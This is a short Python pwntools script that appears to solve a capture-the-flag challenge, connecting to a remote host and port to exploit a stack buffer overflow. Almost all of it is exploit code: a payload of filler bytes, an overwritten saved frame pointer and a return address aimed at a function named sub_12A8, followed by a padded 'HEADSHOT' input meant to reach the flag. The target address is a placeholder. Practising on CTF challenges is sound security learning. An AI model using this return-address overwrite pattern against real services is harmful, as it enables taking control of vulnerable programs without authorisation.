from pwn import *

# Set up the connection to the challenge
target_ip = '137.184.250.54'
target_port = 7051

# Establish the connection
conn = remote(target_ip, target_port)

# Address of sub_12A8 (replace with the actual address found during analysis)
sub_12A8_address = 0x12345678  # Update this with the actual address

# Craft the payload to control the execution flow
payload = b'A' * 80                # Fill the buffer
payload += b'B' * 8               # Overwrite saved RBP (optional)
payload += p64(sub_12A8_address)  # Overwrite return address

# Send the payload
conn.sendline(payload)

# Receive the server's output until it prompts for the target
response = conn.recvuntil(b'Choose your target: ')
print(response.decode())

# Send the target input, which should trigger the correct path
target_input = b'HEADSHOT' + b'A' * (80 - len('HEADSHOT'))  # Adjust to fit the buffer
conn.sendline(target_input)

# Wait for the next output which should ideally contain the flag
final_response = conn.recvall(timeout=2)
print(final_response.decode())

# Close the connection
conn.close()
